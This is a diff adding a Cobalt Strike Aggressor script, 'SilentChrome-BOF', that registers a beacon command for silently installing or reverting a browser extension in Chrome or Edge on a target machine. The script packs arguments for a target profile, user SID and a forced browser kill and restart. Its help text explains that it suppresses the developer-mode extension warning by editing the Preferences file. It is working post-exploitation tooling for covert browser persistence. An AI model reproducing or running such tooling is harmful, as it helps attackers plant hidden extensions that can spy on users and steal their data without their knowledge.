@@ -1,0 +1,106 @@
+########################################
+# SilentChrome-BOF
+########################################
+
+sub readbof {
+    local('$barch $handle $data $msg');
+    $barch = barch($1);
+
+    $handle = openf(script_resource("silentchrome. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0)
+    {
+        $handle = openf(script_resource("silentchrome-debug. $+ $barch $+ .o"));
+        $data = readb($handle, -1);
+        closef($handle);
+    }
+
+    if (strlen($data) == 0)
+    {
+        berror($1, "Could not read silentchrome BOF file");
+    }
+
+    $msg = iff(($2 eq $null || $2 eq ""), "Running silentchrome", $2);
+    btask($1, $msg);
+    return $data;
+}
+
+# Extract a flag value from the raw command string, handling quoted values
+sub extractFlag {
+    local('$raw $flag $pattern @matches');
+    $raw = $1;
+    $flag = $2;
+
+    # Try quoted value first: /flag:"value with spaces"
+    $pattern = '/' . $flag . ':"([^"]+)"';
+    if ($raw ismatch '.*' . $pattern . '.*')
+    {
+        return matched()[0];
+    }
+
+    # Unquoted value: /flag:value
+    $pattern = '/' . $flag . ':(\S+)';
+    if ($raw ismatch '.*' . $pattern . '.*')
+    {
+        return matched()[0];
+    }
+
+    return "";
+}
+
+beacon_command_register(
+    "silentchrome",
+    "Silently install/revert a browser extension for Chrome or Edge",
+    "Usage:\n  silentchrome install /browser:<chrome|msedge> /profilepath:<path> /extpath:<extension_path> [/sid:<SID>] [/force] [/backupext:<ext>]\n  silentchrome revert /browser:<chrome|msedge> /profilepath:<path> /extpath:<extension_path> [/sid:<SID>] [/force] [/backupext:<ext>]\n\nOptions:\n  /extpath   - Path to unpacked extension directory (required for install and revert).\n  /sid       - Target user SID. Auto-detected if omitted. Required when running as SYSTEM.\n  /force     - Kill running browser, perform action, and restart.\n               Without /force, the BOF will warn and abort if the browser is running.\n  /backupext - Backup file extension (default: backupssc). Must match between install and revert.\n\nNote: The developer mode extensions warning popup is automatically suppressed\n      by setting dev_mode_warning_snooze_end_time in the Preferences file.\n\nExample:\n  silentchrome install /browser:chrome /profilepath:C:\\Users\\john /extpath:C:\\ext\n  silentchrome install /browser:chrome /profilepath:C:\\Users\\john /extpath:C:\\ext /force\n  silentchrome install /browser:chrome /profilepath:C:\\Users\\john /extpath:C:\\ext /force /backupext:bak\n  silentchrome install /browser:msedge /profilepath:\"C:\\Users\\john\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\" /extpath:C:\\ext /force\n  silentchrome revert /browser:chrome /profilepath:C:\\Users\\john /extpath:C:\\ext /force"
+);
+
+alias silentchrome {
+    local('$action $browser $sid $profilepath $extpath $forceFlag $backupext $args $actionInt $raw');
+
+    if ($2 eq $null)
+    {
+        berror($1, "Usage: silentchrome <install|revert> /browser:<chrome|msedge> /profilepath:<path> /extpath:<ext_path> [/sid:<SID>] [/force]");
+        return;
+    }
+
+    $action = lc($2);
+    $actionInt = 0;
+    if ($action eq "install")
+    {
+        $actionInt = 1;
+    }
+    else if ($action eq "revert")
+    {
+        $actionInt = 2;
+    }
+    else
+    {
+        berror($1, "Unknown action: $action (use install or revert)");
+        return;
+    }
+
+    $raw = $0;
+    $browser = extractFlag($raw, "browser");
+    $sid = extractFlag($raw, "sid");
+    $profilepath = extractFlag($raw, "profilepath");
+    $extpath = extractFlag($raw, "extpath");
+    $backupext = extractFlag($raw, "backupext");
+    $forceFlag = iff($raw ismatch '.*\/force(\s|$).*', 1, 0);
+
+    if ($browser eq "" || $profilepath eq "")
+    {
+        berror($1, "Missing required arguments: /browser, /profilepath");
+        return;
+    }
+
+    if ($extpath eq "")
+    {
+        berror($1, "Missing /extpath (required for install and revert)");
+        return;
+    }
+
+    $args = bof_pack($1, "izzzziz", $actionInt, $browser, $sid, $profilepath, $extpath, $forceFlag, $backupext);
+    beacon_inline_execute($1, readbof($1, "SilentChrome $action"), "go", $args);
+}
